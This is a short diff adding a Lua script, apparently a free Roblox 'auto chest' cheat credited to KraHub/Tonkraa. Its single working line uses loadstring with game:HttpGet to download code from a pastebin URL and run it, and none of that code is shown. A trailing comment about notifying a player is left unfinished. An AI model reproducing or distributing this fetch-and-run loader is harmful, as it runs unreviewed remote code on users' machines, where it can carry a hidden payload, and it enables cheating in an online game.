@@ -1,0 +1,12 @@
+-- KraHub free script
+-- Extra script auto chest
+-- New versions New.0.001Bf
+
+-- Made by KraHubs/Tonkraa
+
+
+-- Runs chest commands
+loadstring(game:HttpGet(("https://pastebin.com/raw/W0QtP8CB")))()
+
+-- Send notification to @player
+ 
